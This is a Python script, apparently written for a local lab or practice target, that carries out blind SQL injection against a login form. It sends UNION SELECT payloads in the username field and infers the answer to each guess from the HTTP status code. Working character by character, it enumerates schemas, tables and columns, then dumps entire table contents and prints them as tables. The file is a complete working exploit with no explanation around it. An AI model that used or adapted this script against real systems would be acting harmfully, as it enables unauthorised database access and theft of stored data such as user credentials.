#!/usr/bin/python3.6

import requests as r
import string
from beautifultable import BeautifulTable as BT

url = 'http://127.0.0.1:5000/auth/login'

sql1 = """'
UNION All SELECT schema_name FROM information_schema.schemata WHERE 
SUBSTR(schema_name,1,%i)='%s' LIMIT 1 OFFSET %i; -- """

sql2 = """'
UNION All SELECT table_name FROM information_schema.tables WHERE 
SUBSTR(table_name,1,%i)='%s' AND TABLE_SCHEMA='{}' LIMIT 1 OFFSET %i; -- """

sql3 = """'
UNION All SELECT column_name FROM information_schema.columns WHERE 
SUBSTR(column_name,1,%i)='%s' AND TABLE_SCHEMA='{}' and table_name='{}' LIMIT 1 OFFSET %i; -- """

sql4 = """'
UNION ALL SELECT {} FROM {}.{} WHERE 
SUBSTR({},1,%i)='%s' LIMIT 1 OFFSET %i; -- """




chars = list(string.printable)
chars.remove(' ')


def brute(sql):
    str_so_far = ''
    table_names = []
    passed = []
    offset = 0 
    
    while True:
        flag1 = False
        while True:
            flag2 = False
            for char in chars:
                if len(str_so_far) == 0 and char in passed:
                    continue
                s = sql % (len(str_so_far) + 1, str_so_far + char, offset)
                if r.post(
                    url, data={'username':s,'password':'creds'}
                ).status_code == 200:
                    str_so_far += char
                    flag2 = True
                    flag1 = True
                    #print(str_so_far, f"'{char}'")
                    break
            if not flag2:
                if str_so_far != '':
                    table_names.append(str_so_far)
                else:
                    offset += 1
                str_so_far = ''
                break
        if not flag1:
            return table_names
        offset = 0
        letter = table_names[-1][0]
        passed.append(letter.upper())
        passed.append(letter.lower())
    return None


if __name__ == "__main__":
    databases = brute(sql1)
    for i in range(len(databases)):
        print(f"{i}: {databases[i]}")
    database_name = databases[int(input('-> '))]

    tables = brute(sql2.format(database_name))

    print()
    for table_name in tables:
        columns = brute(sql3.format(database_name, table_name))
        t = []
        for c in columns:
            t.append(brute(sql4.format(c, database_name, table_name, c)))

        table = BT()
        table.column_headers = columns
        for row in zip(*t):
            table.append_row(row)
        print(table_name)
        print(table)
    
